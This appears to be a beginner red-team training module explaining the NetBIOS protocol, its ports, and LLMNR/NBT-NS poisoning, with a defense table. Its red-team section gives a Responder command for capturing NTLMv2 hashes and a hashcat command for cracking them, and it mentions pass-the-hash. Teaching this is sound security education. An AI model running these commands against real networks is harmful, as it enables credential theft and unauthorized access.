# 01 — NetBIOS (Network Basic Input/Output System)

> **Module:** Network Enumeration
> **Difficulty:** Beginner
> **RTO Relevance:** 🔴 High — LLMNR/NBT-NS Poisoning is one of the most common internal network attacks

---

## 📌 What is NetBIOS?

NetBIOS is a legacy communication protocol that allows computers on a **Local Area Network (LAN)** to communicate with each other using **names instead of IP addresses**.

Think of it like a phone directory — instead of remembering someone's phone number (IP), you just call them by name (`\\HR-PC-01`).

> **Key Point:** NetBIOS only works on LAN. It does NOT route over the internet.

---

## 🏗️ How NetBIOS Works — 3 Services

NetBIOS operates through three distinct services:

### 1. Name Service (NetBIOS-NS) — UDP 137
Resolves computer names to IP addresses on the local network.

```
PC-A wants to reach \\FILE-SERVER
    ↓
Broadcasts on LAN: "Who is FILE-SERVER?"
    ↓
FILE-SERVER responds: "I am at 192.168.1.50"
    ↓
Connection established
```

### 2. Datagram Service (NetBIOS-DGS) — UDP 138
Sends data **without establishing a connection first** (like UDP — fire and forget).
Used for sending quick messages and broadcasts across the network.

### 3. Session Service (NetBIOS-SSN) — TCP 139
Establishes a **reliable two-way connection** between two computers before transferring data (like TCP).
This is what SMB uses to transfer files over NetBIOS.

---

## 🔌 Important Ports

| Port | Protocol | Service |
|------|----------|---------|
| UDP 137 | NetBIOS-NS | Name Service |
| UDP 138 | NetBIOS-DGS | Datagram Service |
| TCP 139 | NetBIOS-SSN | Session Service |

---

## 🔴 Red Team Perspective

### The Critical Weakness — LLMNR/NBT-NS Poisoning

When a Windows computer cannot find a resource (file share, printer, server), it **broadcasts a request on the entire LAN**:

```
PC-A: "Hey everyone! Does anyone know where \\FILESERVER is?"
    ↓
[Network is silent... or is it?]
    ↓
RED TEAMER (using Responder): "Yes! I am FILESERVER. Send me your credentials."
    ↓
PC-A sends NTLMv2 password hash to attacker
```

This attack is called **LLMNR/NBT-NS Poisoning** and it requires **zero credentials** to execute.

### Tool Used: Responder

```bash
# Start Responder on your network interface
sudo responder -I eth0 -wrf

# What Responder captures:
# [*] [NBT-NS] Poisoned answer sent to 192.168.1.20
# [SMB] NTLMv2-SSP Hash: ali.hassan::TECHCORP:abc123...
```

### What To Do With Captured Hash?

```
Captured Hash
    ↓
Option 1: Crack with Hashcat
hashcat -m 5600 hash.txt rockyou.txt
    ↓
Plaintext password recovered

Option 2: Pass-the-Hash (NTLM)
Use hash directly without cracking
```

---

## 🛡️ Defense Perspective

| Defense | How It Helps |
|---------|-------------|
| Disable LLMNR via GPO | Stops broadcast name resolution |
| Disable NBT-NS | Removes NetBIOS over TCP/IP |
| Enable SMB Signing | Prevents relay attacks |
| Network Segmentation | Limits broadcast domain |

---

## 📝 Key Takeaways

- NetBIOS = Legacy LAN name resolution protocol
- 3 services: Name (137), Datagram (138), Session (139)
- Works on **LAN only** — not routable
- LLMNR/NBT-NS Poisoning = Most common internal network attack
- Tool: **Responder** — captures NTLMv2 hashes passively

---

*← Back to [README](../../README.md) | Next: [SNMP →](02-snmp.md)*
